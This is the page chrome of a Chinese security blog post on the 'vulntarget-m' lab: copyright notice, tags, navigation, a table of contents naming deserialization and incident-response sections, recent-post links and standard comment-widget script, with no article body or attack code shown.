</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://mssnharvey.github.io">Harvey</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://mssnharvey.github.io/2024/10/27/vulntarget-m/">https://mssnharvey.github.io/2024/10/27/vulntarget-m/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://mssnharvey.github.io" target="_blank">MssnHarvey</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/vulntarget/">vulntarget</a><a class="post-meta__tags" href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a><a class="post-meta__tags" href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/">内存马</a></div><div class="post-share"><div class="social-share" data-image="/../imgs/vulntarget-m.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related  no-desc" href="/2024/11/16/vulntarget-n/" title="vulntarget-n"><img class="cover" src="/../imgs/vulntarget-n.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">vulntarget-n</div></div></div></a><a class="pagination-related  no-desc" href="/2024/03/14/tomcat%E5%AE%9E%E7%8E%B0%E5%9B%BD%E5%AF%86ssl/" title="tomcat实现国密ssl"><img class="cover" src="/../imgs/tomcatssl.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">tomcat实现国密ssl</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related no-desc" href="/2024/11/16/vulntarget-n/" title="vulntarget-n"><img class="cover" src="/../imgs/vulntarget-n.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-16</div><div class="info-item-2">vulntarget-n</div></div></div></a><a class="pagination-related no-desc" href="/2022/12/06/vulntarget-d/" title="vulntarget-d"><img class="cover" src="/../imgs/vulntarget-d.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-06</div><div class="info-item-2">vulntarget-d</div></div></div></a><a class="pagination-related no-desc" href="/2022/12/13/vulntarget-f/" title="vulntarget-f"><img class="cover" src="/../imgs/vulntarget-f.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-13</div><div class="info-item-2">vulntarget-f</div></div></div></a><a class="pagination-related no-desc" href="/2022/12/09/vulntarget-e/" title="vulntarget-e"><img class="cover" src="/../imgs/vulntarget-e.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-09</div><div class="info-item-2">vulntarget-e</div></div></div></a><a class="pagination-related no-desc" href="/2023/01/13/vulntarget-k/" title="vulntarget-k"><img class="cover" src="/../imgs/vulntarget-k.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-13</div><div class="info-item-2">vulntarget-k</div></div></div></a><a class="pagination-related no-desc" href="/2023/01/04/vulntarget-j/" title="vulntarget-j"><img class="cover" src="/../imgs/vulntarget-j.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-04</div><div class="info-item-2">vulntarget-j</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Harvey</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/MssnHarvey/" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:mssnharvey@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Bro, you're under arrest.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%89%93%E7%82%B9"><span class="toc-number">3.</span> <span class="toc-text">web打点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nacos-Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">3.1.</span> <span class="toc-text">Nacos Hessian 反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E2%85%A0"><span class="toc-number">3.2.</span> <span class="toc-text">应急响应Ⅰ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#shiro-CB%E9%93%BE-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">4.1.</span> <span class="toc-text">shiro CB链 反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E2%85%A1"><span class="toc-number">4.2.</span> <span class="toc-text">应急响应Ⅱ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-c3p0%E9%93%BE-%E4%BA%8C%E6%AC%A1%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">4.3.</span> <span class="toc-text">fastjson c3p0链 二次序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E2%85%A2"><span class="toc-number">4.4.</span> <span class="toc-text">应急响应Ⅲ</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/02/01/%E7%BA%A2%E9%98%9F%E5%A4%87%E5%BF%98%E5%BD%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%AF%87/" title="红队备忘录-信息收集篇"><img src="/../imgs/xxsj.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红队备忘录-信息收集篇"/></a><div class="content"><a class="title" href="/2026/02/01/%E7%BA%A2%E9%98%9F%E5%A4%87%E5%BF%98%E5%BD%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%AF%87/" title="红队备忘录-信息收集篇">红队备忘录-信息收集篇</a><time datetime="2026-02-01T12:19:43.000Z" title="发表于 2026-02-01 20:19:43">2026-02-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/19/FineReport%20RCE202512/" title="帆软报表前台远程代码执行漏洞"><img src="/../imgs/FineReport2512.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="帆软报表前台远程代码执行漏洞"/></a><div class="content"><a class="title" href="/2026/01/19/FineReport%20RCE202512/" title="帆软报表前台远程代码执行漏洞">帆软报表前台远程代码执行漏洞</a><time datetime="2026-01-19T08:28:33.000Z" title="发表于 2026-01-19 16:28:33">2026-01-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/16/vulntarget-n/" title="vulntarget-n"><img src="/../imgs/vulntarget-n.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulntarget-n"/></a><div class="content"><a class="title" href="/2024/11/16/vulntarget-n/" title="vulntarget-n">vulntarget-n</a><time datetime="2024-11-16T12:16:47.000Z" title="发表于 2024-11-16 20:16:47">2024-11-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/10/27/vulntarget-m/" title="vulntarget-m"><img src="/../imgs/vulntarget-m.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulntarget-m"/></a><div class="content"><a class="title" href="/2024/10/27/vulntarget-m/" title="vulntarget-m">vulntarget-m</a><time datetime="2024-10-27T14:03:25.000Z" title="发表于 2024-10-27 22:03:25">2024-10-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/14/tomcat%E5%AE%9E%E7%8E%B0%E5%9B%BD%E5%AF%86ssl/" title="tomcat实现国密ssl"><img src="/../imgs/tomcatssl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="tomcat实现国密ssl"/></a><div class="content"><a class="title" href="/2024/03/14/tomcat%E5%AE%9E%E7%8E%B0%E5%9B%BD%E5%AF%86ssl/" title="tomcat实现国密ssl">tomcat实现国密ssl</a><time datetime="2024-03-14T07:28:33.000Z" title="发表于 2024-03-14 15:28:33">2024-03-14</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2026 By Harvey</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
  const option = null

  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'

  const createScriptElement = config => {
    const ele = document.createElement('script')
    Object.entries(config).forEach(([key, value]) => {
      ele.setAttribute(key, value)
    })
    return ele
  }

  const loadGiscus = (el = document, key) => {
    const mappingConfig = isShuoshuo
      ? { 'data-mapping': 'specific', 'data-term': key }
      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }

    const giscusConfig = {
      src: 'https://giscus.app/client.js',
      'data-repo': 'MssnHarvey/Giscus',
      'data-repo-id': 'R_kgDORNvvEQ',
      'data-category-id': 'DIC_kwDORNvvEc4C2M_B',
      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
      'data-reactions-enabled': '1',
      crossorigin: 'anonymous',
      async: true,
      ...option,
      ...mappingConfig
    }

    const scriptElement = createScriptElement(giscusConfig)

    el.querySelector('#giscus-wrap').appendChild(scriptElement)

    if (isShuoshuo) {
      window.shuoshuoComment.destroyGiscus = () => {
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }
  }

  const changeGiscusTheme = theme => {
    const iframe = document.querySelector('#giscus-wrap iframe')
    if (iframe) {
      const message = {
        giscus: {
          setConfig: {
            theme: getGiscusTheme(theme)
          }
        }
      }
      iframe.contentWindow.postMessage(message, 'https://giscus.app')
    }
  }

  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')

  if (isShuoshuo) {
    'Giscus' === 'Giscus'
      ? window.shuoshuoComment = { loadComment: loadGiscus }
      : window.loadOtherComment = loadGiscus
    return
  }

  if ('Giscus' === 'Giscus' || !true) {
    if (true) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
    else loadGiscus()
  } else {
    window.loadOtherComment = loadGiscus
  }
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.4"></script></div></div></body></html>